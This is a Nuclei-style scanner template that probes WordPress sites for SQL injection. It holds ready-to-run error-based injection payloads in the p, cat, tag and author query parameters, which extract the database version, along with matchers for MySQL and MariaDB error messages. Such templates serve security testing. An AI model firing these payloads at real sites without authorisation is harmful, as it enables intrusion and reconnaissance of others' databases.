id: wordpress-sqli

info:
  name: WordPress SQL Injection Detection
  author: YourName
  severity: critical
  description: Detects potential SQL Injection vulnerabilities in WordPress
  tags: wordpress,sqli,cwe-89

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?p=1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
      - "{{BaseURL}}/?cat=1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
      - "{{BaseURL}}/?tag=1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
      - "{{BaseURL}}/?author=1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "MySQL"
          - "MariaDB"
          - "SQL syntax"
        condition: or
        
      - type: status
        status:
          - 200
          
      - type: regex
        regex:
          - "(?i)MySQL.*?([0-9]+\\.[0-9]+\\.[0-9]+)"
          - "(?i)MariaDB.*?([0-9]+\\.[0-9]+\\.[0-9]+)"
          - "(?i)SQL syntax.*?MySQL"
        condition: or
